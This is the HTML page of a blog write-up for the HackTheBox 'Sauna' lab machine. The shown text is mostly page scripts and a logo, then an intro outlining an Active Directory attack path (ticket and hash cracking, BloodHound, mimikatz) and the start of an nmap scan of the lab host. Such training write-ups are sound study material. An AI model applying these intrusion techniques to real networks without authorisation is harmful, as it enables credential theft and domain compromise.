<!DOCTYPE html><html lang="en">
  <head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>HackTheBox Sauna - D3c0deZ3r0</title>

<meta name="description" content="Sauna is one of the machines currently a Active machine on the HackTheBox hacking platform and is of easy difficulty. In this case it is a machine based on t...">
<link rel="canonical" href="http://localhost:4000/hackthebox/retired/2020/06/19/Sauna.html"><link rel="alternate" type="application/rss+xml" title="D3c0deZ3r0" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="manifest" href="/site.webmanifest"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">

<meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/browserconfig.xml">

<meta name="theme-color" content="#ffffff">
<!-- end favicons snippet -->




<link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->

<!-- end custom head snippets -->
<script>(function() {
  window.isArray = function(val) {
    return Object.prototype.toString.call(val) === '[object Array]';
  };
  window.isString = function(val) {
    return typeof val === 'string';
  };

  window.hasEvent = function(event) {
    return 'on'.concat(event) in window.document;
  };

  window.isOverallScroller = function(node) {
    return node === document.documentElement || node === document.body || node === window;
  };

  window.isFormElement = function(node) {
    var tagName = node.tagName;
    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
  };

  window.pageLoad = (function () {
    var loaded = false, cbs = [];
    window.addEventListener('load', function () {
      var i;
      loaded = true;
      if (cbs.length > 0) {
        for (i = 0; i < cbs.length; i++) {
          cbs[i]();
        }
      }
    });
    return {
      then: function(cb) {
        cb && (loaded ? cb() : (cbs.push(cb)));
      }
    };
  })();
})();
(function() {
  window.throttle = function(func, wait) {
    var args, result, thisArg, timeoutId, lastCalled = 0;

    function trailingCall() {
      lastCalled = new Date;
      timeoutId = null;
      result = func.apply(thisArg, args);
    }
    return function() {
      var now = new Date,
        remaining = wait - (now - lastCalled);

      args = arguments;
      thisArg = this;

      if (remaining <= 0) {
        clearTimeout(timeoutId);
        timeoutId = null;
        lastCalled = now;
        result = func.apply(thisArg, args);
      } else if (!timeoutId) {
        timeoutId = setTimeout(trailingCall, remaining);
      }
      return result;
    };
  };
})();
(function() {
  var Set = (function() {
    var add = function(item) {
      var i, data = this._data;
      for (i = 0; i < data.length; i++) {
        if (data[i] === item) {
          return;
        }
      }
      this.size ++;
      data.push(item);
      return data;
    };

    var Set = function(data) {
      this.size = 0;
      this._data = [];
      var i;
      if (data.length > 0) {
        for (i = 0; i < data.length; i++) {
          add.call(this, data[i]);
        }
      }
    };
    Set.prototype.add = add;
    Set.prototype.get = function(index) { return this._data[index]; };
    Set.prototype.has = function(item) {
      var i, data = this._data;
      for (i = 0; i < data.length; i++) {
        if (this.get(i) === item) {
          return true;
        }
      }
      return false;
    };
    Set.prototype.is = function(map) {
      if (map._data.length !== this._data.length) { return false; }
      var i, j, flag, tData = this._data, mData = map._data;
      for (i = 0; i < tData.length; i++) {
        for (flag = false, j = 0; j < mData.length; j++) {
          if (tData[i] === mData[j]) {
            flag = true;
            break;
          }
        }
        if (!flag) { return false; }
      }
      return true;
    };
    Set.prototype.values = function() {
      return this._data;
    };
    return Set;
  })();

  window.Lazyload = (function(doc) {
    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
    var createNode = function(name, attrs) {
      var node = doc.createElement(name), attr;
      for (attr in attrs) {
        if (attrs.hasOwnProperty(attr)) {
          node.setAttribute(attr, attrs[attr]);
        }
      }
      return node;
    };
    var end = function(type, url) {
      var s, q, qi, cbs, i, j, cur, val, flag;
      if (type === 'js' || type ==='css') {
        s = sources[type], q = queue[type];
        s[url] = true;
        for (i = 0; i < q.length; i++) {
          cur = q[i];
          if (cur.urls.has(url)) {
            qi = cur, val = qi.urls.values();
            qi && (cbs = qi.callbacks);
            for (flag = true, j = 0; j < val.length; j++) {
              cur = val[j];
              if (!s[cur]) {
                flag = false;
              }
            }
            if (flag && cbs && cbs.length > 0) {
              for (j = 0; j < cbs.length; j++) {
                cbs[j].call(context);
              }
              qi.load = true;
            }
          }
        }
      }
    };
    var load = function(type, urls, callback) {
      var s, q, qi, node, i, cur,
        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
      if (type === 'js' || type ==='css') {
        s = sources[type], q = queue[type];
        for (i = 0; i < q.length; i++) {
          cur = q[i];
          if (_urls.is(cur.urls)) {
            qi = cur;
            break;
          }
        }
        val = _urls.values();
        if (qi) {
          callback && (qi.load || qi.callbacks.push(callback));
          callback && (qi.load && callback());
        } else {
          q.push({
            urls: _urls,
            callbacks: callback ? [callback] : [],
            load: false
          });
          for (i = 0; i < val.length; i++) {
            node = null, url = val[i];
            if (s[url] === undefined) {
              (type === 'js' ) && (node = createNode('script', { src: url }));
              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
              if (node) {
                node.onload = (function(type, url) {
                  return function() {
                    end(type, url);
                  };
                })(type, url);
                (doc.head || doc.body).appendChild(node);
                s[url] = false;
              }
            }
          }
        }
      }
    };
    return {
      js: function(url, callback) {
        load('js', url, callback);
      },
      css: function(url, callback) {
        load('css', url, callback);
      }
    };
  })(this.document);
})();
</script><script>
  (function() {
    var TEXT_VARIABLES = {
      version: '2.2.6',
      sources: {
        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
        gitalk: {
          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
        },
        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
      },
      site: {
        toc: {
          selectors: 'h1,h2,h3'
        }
      },
      paths: {
        search_js: '/assets/search.js'
      }
    };
    window.TEXT_VARIABLES = TEXT_VARIABLES;
  })();
</script>
</head>
  <body>
    <div class="root" data-is-touch="false">
      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">

      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
      <div class="header__title">
        <div class="header__brand"><?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
 "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
 width="488.000000pt" height="490.000000pt" viewBox="0 0 488.000000 490.000000"
 preserveAspectRatio="xMidYMid meet">

<g transform="translate(0.000000,490.000000) scale(0.100000,-0.100000)"
fill="#000000" stroke="none">
<path d="M2352 4791 c-69 -26 -171 -82 -247 -136 -143 -102 -210 -182 -263
-316 -17 -41 -57 -135 -91 -209 -108 -241 -106 -301 14 -490 19 -30 31 -58 27
-62 -9 -9 -276 -123 -467 -200 -82 -33 -166 -68 -185 -78 -62 -32 -129 -109
-172 -199 -22 -46 -43 -79 -48 -75 -22 25 -134 242 -171 332 -23 56 -46 102
-51 102 -4 0 -6 -10 -4 -22 3 -13 22 -135 42 -273 39 -270 42 -280 99 -270 16
3 149 21 295 40 458 59 888 87 1340 87 425 0 654 -16 1289 -93 185 -22 338
-36 342 -32 5 5 14 36 20 68 13 73 68 489 64 493 -1 1 -13 -23 -25 -55 -36
-90 -113 -241 -163 -318 l-46 -70 -10 28 c-61 159 -130 234 -266 287 -116 45
-580 242 -587 248 -4 4 16 43 44 87 59 91 78 147 78 219 0 63 -23 127 -135
380 -76 172 -95 206 -144 259 -77 83 -193 167 -315 228 -123 61 -183 70 -264
40z m216 -156 c71 -36 108 -65 81 -65 -8 0 -49 7 -92 15 -139 27 -243 -16
-313 -130 -10 -16 -35 -51 -56 -76 -21 -25 -38 -48 -38 -51 0 -3 57 -9 126
-13 69 -4 122 -11 117 -15 -4 -5 -74 -29 -154 -54 -81 -26 -158 -55 -172 -66
-23 -18 -40 -53 -31 -63 3 -2 48 4 102 13 135 25 282 30 282 10 0 -17 -42 -33
-133 -51 -90 -18 -146 -44 -131 -59 5 -5 114 -4 244 2 174 8 265 8 350 -1 188
-18 181 -26 -23 -26 -246 -1 -408 -25 -646 -97 -129 -40 -171 -73 -171 -137 0
-48 32 -132 85 -222 34 -59 35 -62 10 -39 -85 78 -175 248 -182 345 -5 57 -1
71 67 240 40 99 86 206 103 238 59 112 236 275 345 318 77 30 147 25 230 -16z
m-89 -932 c22 -74 22 -78 4 -91 -22 -16 -78 -9 -103 13 -15 14 -18 14 -30 0
-10 -12 -10 -21 -2 -40 7 -14 16 -25 22 -25 6 0 8 -4 5 -10 -12 -20 -63 -10
-101 21 -85 67 -88 62 -22 -28 51 -69 66 -77 148 -69 36 4 74 4 83 0 31 -12
17 -24 -28 -24 -51 0 -52 -3 -34 -76 6 -25 9 -47 6 -50 -3 -4 -31 6 -62 20
-77 35 -164 125 -209 218 -40 80 -57 148 -37 148 63 0 261 35 286 50 17 10 35
19 40 19 6 1 21 -34 34 -76z m250 10 l24 -6 -24 -13 c-41 -23 -110 -17 -144
12 l-30 25 75 -6 c41 -3 86 -9 99 -12z m-855 -239 c18 -18 213 -248 236 -279
16 -20 -178 110 -263 177 -54 42 -80 47 -116 19 l-25 -19 53 -71 c30 -40 51
-74 48 -77 -3 -4 -39 14 -79 39 -40 25 -84 48 -98 52 -42 10 -291 -84 -338
-128 -33 -30 -48 -62 -62 -131 -11 -53 -13 -57 -28 -43 -9 9 -17 40 -20 71 -2
31 -9 56 -14 56 -6 0 -22 -8 -36 -18 -51 -35 -52 -35 -41 -3 23 66 67 93 322
196 133 55 283 116 332 137 104 43 108 43 129 22z m1474 -110 c169 -70 324
-135 344 -145 33 -17 98 -102 86 -114 -2 -2 -26 12 -54 32 -27 19 -85 52 -129
73 -92 44 -383 150 -410 150 -10 0 -50 -25 -90 -55 -39 -30 -75 -55 -79 -55
-4 0 13 26 37 58 61 80 61 81 41 103 -22 25 -55 24 -105 -2 -23 -11 -43 -19
-45 -16 -6 6 76 97 87 97 6 0 148 -57 317 -126z"/>
<path d="M2105 2961 c-49 -4 -101 -12 -115 -18 -46 -20 -79 -67 -139 -203 -52
-115 -61 -144 -61 -193 0 -67 8 -87 103 -244 93 -153 99 -157 262 -161 143 -4
180 4 195 43 10 27 -2 74 -23 87 -7 4 -67 8 -134 8 l-121 0 -72 123 c-56 97
-70 128 -66 152 2 17 29 83 59 146 l54 116 129 6 c124 6 130 8 152 33 25 29
24 66 -3 93 -17 18 -95 22 -220 12z"/>
<path d="M2594 2961 c-12 -5 -25 -18 -29 -28 -4 -10 -10 -182 -12 -383 -5
-399 -6 -394 52 -406 22 -4 38 0 55 14 23 19 25 28 30 132 l5 112 149 -137
c139 -128 150 -136 184 -133 44 4 69 39 58 81 -4 17 -67 83 -176 183 l-170
157 53 39 c28 22 116 84 193 139 78 55 145 106 148 115 25 65 -32 118 -97 90
-18 -7 -99 -61 -181 -120 -81 -58 -150 -106 -152 -106 -3 0 -3 49 -2 110 2 87
0 112 -12 124 -19 20 -69 28 -96 17z"/>
<path d="M3356 2889 c-8 -48 -76 -729 -76 -759 l0 -25 223 -30 c122 -16 237
-29 256 -29 40 1 61 24 61 69 0 55 -21 64 -209 89 -94 13 -173 25 -176 27 -2
2 2 47 8 99 11 83 14 95 31 93 10 -1 49 -4 87 -8 60 -6 69 -5 88 14 12 12 21
34 21 51 0 48 -29 68 -108 76 -38 3 -75 9 -81 13 -11 7 4 180 17 192 4 3 81
-4 172 -17 91 -13 179 -23 196 -23 76 -2 90 111 16 133 -20 6 -355 52 -454 62
l-67 7 -5 -34z"/>
<path d="M1224 2880 c-12 -4 -24 -16 -28 -26 -9 -25 -59 -333 -92 -568 l-27
-199 28 -24 c20 -18 35 -23 54 -18 40 9 58 38 71 114 13 78 9 76 139 87 l66 5
32 -70 c24 -54 37 -72 57 -77 39 -9 75 3 88 31 13 29 11 34 -115 330 -121 284
-174 398 -194 413 -19 14 -48 15 -79 2z m134 -491 c-7 -5 -32 -9 -54 -9 l-41
0 13 83 c8 45 14 87 15 92 0 6 19 -28 40 -74 31 -65 37 -86 27 -92z"/>
<path d="M4154 2797 c-7 -19 -144 -739 -144 -758 0 -44 97 -73 124 -37 7 9 27
90 46 180 18 90 36 169 40 176 6 12 82 -151 171 -368 32 -79 45 -92 93 -88 34
2 43 8 55 32 13 28 10 38 -58 205 -91 220 -89 216 -65 207 78 -30 182 -10 227
44 35 41 60 150 47 200 -13 49 -49 93 -95 114 -20 10 -118 35 -218 57 -100 21
-190 41 -200 43 -10 3 -20 -1 -23 -7z m284 -192 c52 -13 98 -27 104 -33 11
-11 -6 -87 -23 -97 -7 -5 -249 41 -266 50 -2 1 3 27 9 58 l12 57 36 -6 c19 -4
77 -17 128 -29z"/>
<path d="M663 2789 c-55 -16 -57 -34 -28 -182 14 -73 28 -139 31 -148 3 -12
-20 -21 -123 -43 -71 -15 -132 -28 -138 -27 -5 0 -25 62 -43 137 -18 76 -40
146 -49 156 -29 33 -106 17 -123 -26 -7 -18 12 -104 81 -371 49 -191 94 -355
99 -365 12 -23 37 -29 78 -18 54 14 57 36 22 183 -17 72 -33 137 -35 146 -4
13 17 21 112 42 111 26 153 32 153 23 0 -8 51 -252 56 -269 3 -10 16 -25 29
-33 35 -23 92 -3 102 34 4 16 -17 150 -56 352 -77 404 -75 394 -106 408 -14 7
-27 12 -28 11 -1 0 -17 -5 -34 -10z"/>
<path d="M2050 2069 c-545 -22 -1030 -81 -1605 -196 -181 -36 -334 -69 -338
-73 -12 -11 9 -47 38 -66 15 -9 190 -46 432 -90 343 -63 411 -78 430 -96 13
-12 63 -85 111 -162 97 -158 200 -299 297 -411 36 -41 65 -79 65 -85 0 -6 -79
-148 -175 -317 -150 -263 -175 -313 -175 -349 0 -27 7 -51 21 -68 47 -59 -32
-56 1291 -56 1185 0 1214 1 1245 20 87 53 85 119 -9 276 -58 97 -236 411 -267
472 -11 21 -6 31 62 110 132 156 236 301 346 485 29 48 62 92 73 98 11 6 136
31 277 55 388 66 548 102 582 132 16 13 29 27 29 31 0 16 -78 41 -215 70 -837
179 -1689 253 -2515 220z m1265 -134 l25 -24 0 -490 0 -490 -24 -28 -24 -28
-852 0 -852 0 -24 28 -24 28 0 485 0 486 29 29 29 29 847 0 846 0 24 -25z
m-14 -1085 c48 -14 76 -46 149 -180 35 -63 103 -185 152 -270 97 -169 106
-203 58 -227 -20 -10 -280 -13 -1221 -13 -1195 0 -1196 0 -1223 21 -14 11 -26
30 -26 41 0 26 326 600 348 613 9 6 26 13 37 17 34 10 1686 9 1726 -2z"/>
<path d="M1627 1873 c-4 -3 -7 -210 -7 -460 l0 -453 820 0 820 0 0 460 0 460
-813 0 c-448 0 -817 -3 -820 -7z m1163 -463 l0 -350 -350 0 -350 0 0 350 0
350 350 0 350 0 0 -350z"/>
<path d="M2106 1740 c-2 -3 -2 -153 -2 -335 l1 -330 335 0 335 0 0 334 0 334
-333 1 c-184 1 -335 -1 -336 -4z m436 -85 c3 -4 2 -25 -3 -48 -20 -94 -15 -87
-68 -87 l-50 0 -14 63 c-8 34 -12 65 -10 70 5 8 137 10 145 2z m-24 -177 c-3
-20 -9 -23 -48 -23 -39 0 -45 3 -48 23 -3 20 0 22 48 22 48 0 51 -2 48 -22z
m-211 -49 c21 -8 24 -14 21 -56 l-3 -47 -60 -13 c-33 -7 -63 -12 -67 -13 -5 0
-8 34 -8 76 l0 76 47 -7 c25 -4 57 -11 70 -16z m83 -39 c0 -22 1 -43 3 -47 1
-5 -10 -9 -25 -11 -27 -3 -28 -1 -28 41 0 48 5 57 32 57 14 0 18 -8 18 -40z
m90 15 c18 -21 -16 -61 -37 -44 -16 14 -17 31 -1 47 16 16 23 15 38 -3z m70
-40 c11 -13 8 -21 -20 -50 -32 -33 -35 -34 -52 -18 -18 16 -17 18 14 50 36 38
41 39 58 18z m120 -85 l25 -19 -50 -51 c-27 -27 -54 -50 -60 -50 -5 0 -25 26
-44 56 l-33 56 33 34 32 33 36 -20 c20 -11 47 -29 61 -39z"/>
<path d="M1600 800 c-30 -30 -24 -40 26 -40 55 0 84 14 84 40 0 17 -7 20 -45
20 -32 0 -51 -6 -65 -20z"/>
<path d="M1746 804 c-22 -22 -20 -33 8 -40 37 -9 78 -1 90 19 8 14 8 20 -4 27
-23 15 -77 12 -94 -6z"/>
<path d="M1897 813 c-12 -3 -17 -12 -15 -26 3 -19 11 -22 51 -25 42 -3 48 0
56 20 7 19 5 24 -13 30 -24 7 -54 8 -79 1z"/>
<path d="M2035 804 c-24 -25 -13 -39 34 -42 45 -3 74 12 69 36 -4 22 -82 26
-103 6z"/>
<path d="M2320 805 c-25 -30 -4 -46 52 -43 45 3 53 6 56 24 2 15 -4 23 -20 28
-39 10 -75 7 -88 -9z"/>
<path d="M2478 813 c-11 -3 -18 -14 -18 -29 0 -22 3 -24 55 -24 46 0 55 3 55
18 0 36 -36 50 -92 35z"/>
<path d="M2618 813 c-43 -11 -10 -53 42 -53 50 0 65 12 51 39 -12 21 -47 26
-93 14z"/>
<path d="M2758 813 c-21 -5 -21 -8 -8 -34 14 -25 97 -28 107 -3 12 32 -42 52
-99 37z"/>
<path d="M2907 813 c-12 -3 -17 -12 -15 -26 3 -20 9 -22 58 -22 49 0 55 2 52
20 -6 32 -40 42 -95 28z"/>
<path d="M3030 807 c0 -37 64 -58 114 -38 19 7 19 8 -2 29 -26 26 -112 32
-112 9z"/>
<path d="M3187 812 c-16 -7 -16 -9 -2 -30 13 -17 26 -22 60 -22 51 0 60 9 39
38 -15 22 -59 28 -97 14z"/>
<path d="M2167 790 c-6 -23 20 -33 74 -28 26 2 35 8 37 26 3 20 0 22 -51 22
-46 0 -55 -3 -60 -20z"/>
<path d="M1560 729 c-10 -17 -9 -23 1 -30 23 -15 87 -10 104 7 25 26 12 39
-43 42 -44 3 -52 0 -62 -19z"/>
<path d="M1709 729 c-14 -27 1 -39 53 -39 38 0 68 20 68 46 0 10 -14 14 -55
14 -45 0 -56 -4 -66 -21z"/>
<path d="M1859 729 c-15 -28 1 -39 58 -39 32 0 45 5 53 20 16 30 4 40 -50 40
-40 0 -51 -4 -61 -21z"/>
<path d="M2011 731 c-16 -29 -15 -29 33 -36 59 -9 88 1 84 28 -3 19 -10 22
-55 25 -43 3 -54 0 -62 -17z"/>
<path d="M2160 741 c0 -5 -3 -16 -6 -25 -5 -14 4 -16 60 -16 64 0 66 1 66 25
0 24 -3 25 -60 25 -33 0 -60 -4 -60 -9z"/>
<path d="M2311 736 c-21 -25 -3 -36 60 -36 57 0 60 1 57 23 -3 19 -10 22 -54
25 -36 2 -54 -1 -63 -12z"/>
<path d="M2460 725 c0 -24 3 -25 60 -25 57 0 60 1 60 25 0 24 -3 25 -60 25
-57 0 -60 -1 -60 -25z"/>
<path d="M2610 725 c0 -24 2 -25 61 -25 57 0 60 1 57 23 -3 19 -10 22 -60 25
-56 3 -58 2 -58 -23z"/>
<path d="M2758 745 c-3 -3 -4 -15 -1 -26 7 -24 41 -33 89 -25 29 6 35 11 32
29 -3 19 -10 22 -58 25 -31 2 -59 0 -62 -3z"/>
<path d="M2908 744 c-12 -11 5 -44 26 -49 11 -2 30 -6 41 -8 12 -3 7 -5 -12
-6 -38 -1 -48 -13 -33 -41 9 -16 21 -20 66 -20 52 0 55 2 52 22 -2 12 -14 28
-27 34 -21 11 -21 13 -6 21 14 8 15 14 6 32 -10 17 -21 21 -60 21 -26 0 -50
-3 -53 -6z"/>
<path d="M3056 741 c-10 -16 6 -41 30 -47 33 -8 94 4 94 19 0 7 -5 18 -12 25
-14 14 -104 16 -112 3z"/>
<path d="M3206 741 c-12 -18 32 -51 67 -51 45 0 65 15 51 37 -12 20 -108 31
-118 14z"/>
<path d="M1527 662 c-30 -33 -21 -42 43 -42 56 0 61 2 70 26 6 14 10 27 10 30
0 2 -24 4 -53 4 -40 0 -58 -5 -70 -18z"/>
<path d="M1680 661 c-19 -37 -13 -42 53 -39 59 3 62 4 65 31 3 27 2 27 -52 27
-44 0 -57 -4 -66 -19z"/>
<path d="M1842 668 c-7 -7 -12 -20 -12 -30 0 -14 9 -18 38 -19 l37 -2 -43 -7
c-45 -7 -62 -21 -62 -53 0 -16 8 -18 61 -15 69 3 94 22 72 56 -9 15 -7 21 8
30 10 7 19 21 19 32 0 17 -7 20 -53 20 -29 0 -58 -5 -65 -12z"/>
<path d="M1990 666 c0 -8 -3 -21 -6 -30 -5 -14 4 -16 60 -16 50 0 66 3 66 14
0 8 3 21 6 30 5 14 -4 16 -60 16 -50 0 -66 -3 -66 -14z"/>
<path d="M2146 664 c-15 -39 -8 -44 59 -44 l65 0 0 30 c0 30 0 30 -59 30 -44
0 -60 -4 -65 -16z"/>
<path d="M2300 650 l0 -30 60 0 60 0 0 30 0 30 -60 0 -60 0 0 -30z"/>
<path d="M2460 650 c0 -30 0 -30 58 -30 32 0 61 2 64 5 3 3 3 17 0 30 -4 23
-8 25 -63 25 -59 0 -59 0 -59 -30z"/>
<path d="M2612 653 c3 -27 5 -28 66 -31 l63 -3 -3 28 c-3 27 -5 28 -66 31
l-63 3 3 -28z"/>
<path d="M2770 650 l0 -30 65 0 c67 0 74 5 59 44 -5 12 -21 16 -65 16 -59 0
-59 0 -59 -30z"/>
<path d="M3080 669 c0 -21 21 -49 38 -49 15 -1 16 -2 1 -13 -22 -17 -8 -53 27
-69 25 -12 26 -13 6 -18 -19 -5 -20 -7 -7 -37 13 -31 17 -33 64 -33 64 0 80 7
74 31 -7 27 -41 49 -78 50 -30 2 -29 2 5 8 28 5 34 10 32 26 -6 31 -22 45 -56
46 -30 2 -30 2 -3 6 29 5 37 29 15 51 -15 15 -118 16 -118 1z"/>
<path d="M3237 659 c3 -11 17 -27 30 -36 17 -12 21 -18 12 -24 -10 -6 -10 -13
-1 -33 11 -24 17 -26 72 -26 65 0 72 8 44 48 -10 15 -26 22 -52 24 -37 1 -37
1 -4 5 34 5 38 13 22 44 -9 15 -22 19 -69 19 -55 0 -59 -2 -54 -21z"/>
<path d="M1486 588 c-29 -41 -21 -48 49 -48 61 0 65 1 71 26 8 33 -7 44 -63
44 -32 0 -46 -5 -57 -22z"/>
<path d="M1658 599 c-10 -5 -18 -21 -18 -34 0 -24 3 -25 60 -25 56 0 61 2 71
27 7 20 6 28 -3 35 -18 11 -89 9 -110 -3z"/>
<path d="M1982 598 c-5 -7 -12 -22 -14 -33 -3 -18 3 -20 62 -20 l65 0 3 33 3
32 -54 0 c-32 0 -59 -5 -65 -12z"/>
<path d="M2142 598 c-7 -7 -12 -22 -12 -35 0 -22 4 -23 65 -23 57 0 65 2 65
19 0 11 3 26 6 35 5 14 -3 16 -53 16 -33 0 -64 -5 -71 -12z"/>
<path d="M2633 603 c-7 -2 -13 -18 -13 -34 l0 -29 65 0 c61 0 65 1 65 23 0 13
-5 28 -12 35 -12 12 -81 15 -105 5z"/>
<path d="M2791 601 c-18 -11 2 -49 32 -60 26 -10 85 -3 93 11 3 5 -2 20 -10
33 -13 20 -25 25 -59 25 -23 0 -48 -4 -56 -9z"/>
<path d="M2947 603 c-9 -15 12 -52 35 -64 23 -13 23 -13 2 -18 -18 -5 -19 -10
-12 -38 9 -33 9 -33 73 -33 56 0 65 3 65 18 0 29 -23 53 -60 62 l-35 8 33 1
c25 1 32 5 32 20 0 33 -28 51 -80 51 -27 0 -51 -3 -53 -7z"/>
<path d="M2292 573 c3 -27 6 -28 66 -31 l62 -3 0 31 0 30 -66 0 -65 0 3 -27z"/>
<path d="M2460 570 l0 -30 65 0 65 0 0 30 0 30 -65 0 -65 0 0 -30z"/>
<path d="M1462 524 c-11 -5 -42 -55 -42 -69 0 -3 30 -5 67 -3 61 3 69 5 82 30
9 15 12 30 8 34 -9 9 -98 15 -115 8z"/>
<path d="M1620 510 c-11 -11 -20 -29 -20 -40 0 -19 5 -21 62 -18 56 3 64 6 77
30 9 15 13 29 11 31 -3 2 -28 7 -57 11 -45 6 -55 4 -73 -14z"/>
<path d="M1789 509 c-11 -11 -19 -28 -19 -39 0 -18 7 -20 60 -20 52 0 62 3 76
25 24 36 14 46 -45 50 -42 2 -58 -2 -72 -16z"/>
<path d="M3324 523 c-17 -3 -21 -9 -16 -26 9 -40 22 -47 89 -47 62 0 64 1 57
23 -15 52 -51 66 -130 50z"/>
<path d="M1946 498 c-12 -46 -9 -48 59 -48 61 0 66 2 75 26 16 42 13 44 -59
44 -63 0 -69 -2 -75 -22z"/>
<path d="M2116 498 c-12 -46 -9 -48 63 -48 63 0 69 2 75 23 12 45 9 47 -63 47
-63 0 -69 -2 -75 -22z"/>
<path d="M2288 490 c-3 -17 -2 -32 0 -35 3 -3 34 -5 69 -5 l63 0 0 35 0 35
-64 0 c-63 0 -64 0 -68 -30z"/>
<path d="M2462 488 l3 -33 68 -3 68 -3 -3 33 -3 33 -68 3 -68 3 3 -33z"/>
<path d="M2629 488 c7 -33 7 -33 74 -36 61 -3 67 -1 67 17 0 45 -9 51 -80 51
l-67 0 6 -32z"/>
<path d="M2796 493 c10 -43 11 -43 80 -43 56 0 64 2 64 19 0 45 -9 51 -81 51
l-69 0 6 -27z"/>
<path d="M2197 393 c-3 -5 -8 -41 -12 -80 l-7 -73 262 0 263 0 -7 71 c-3 39
-9 75 -12 80 -6 11 -481 12 -487 2z"/>
</g>
</svg>
<a title="Cyber-Sec blogs, HackTheBox writeup's, Tryhackme writeup's, Vulnhub witeup's, Portfolio.
" href="/">D3c0deZ3r0</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
        <ul><li class="navigation__item"><a href="/archive.html">Archive</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="/Machines.html">Machines</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
      </nav></div>
  </header>
</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">

              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
</aside></div>

              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->

<!-- end custom main top snippet -->
<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>HackTheBox Sauna</h1></header><span class="split-space">&nbsp;</span>
          <a class="edit-on-github"
            title="Edit on Github"
            href="https://github.com/user_name/repo_name/tree/master/_posts/2020-06-20-Sauna.md">
            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="HackTheBox Sauna"><div class="article__info clearfix"><ul class="left-col menu"><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=windows">windows</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=activedirectory">activedirectory</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=evilwinrm">evilwinrm</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=hashcat">hashcat</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=impacket">impacket</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=bloodhound">bloodhound</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=mimikatz">mimikatz</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=rpcclient">rpcclient</a>
            </li></ul><ul class="right-col menu"><li><i class="fas fa-user"></i> <span>Jeevan</span></li><li><i class="far fa-calendar-alt"></i> <span>Jun 19, 2020</span>
            </li></ul></div><meta itemprop="author" content="Jeevan"/><meta itemprop="datePublished" content="2020-06-19T22:04:00+05:30">
    <meta itemprop="keywords" content="windows,activedirectory,evilwinrm,hashcat,impacket,bloodhound,mimikatz,rpcclient"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->

<!-- end custom article top snippet -->
<div class="article__content" itemprop="articleBody"><p><img src="/assets/img/sample/sauna.png" alt="" /></p>
<blockquote>
  <p>Sauna is one of the machines currently a Active machine on the HackTheBox hacking platform and is of easy difficulty. In this case it is a machine based on the Windows Operating System. Need to gather the user name from the aboutUs page, cracking the TGT of the users, cracking the hash of the user, running winPEAS, using BloodHound and mimikatz for privilege escalation.</p>
</blockquote>

<h2 id="lets-get-started">Let’s get started</h2>

<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap 7.80 scan initiated Sat Apr  4 05:52:33 2020 as: nmap -sV -A -o nmap.sauna 10.10.10.175
Nmap scan report for 10.10.10.175
Host is up (0.20s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
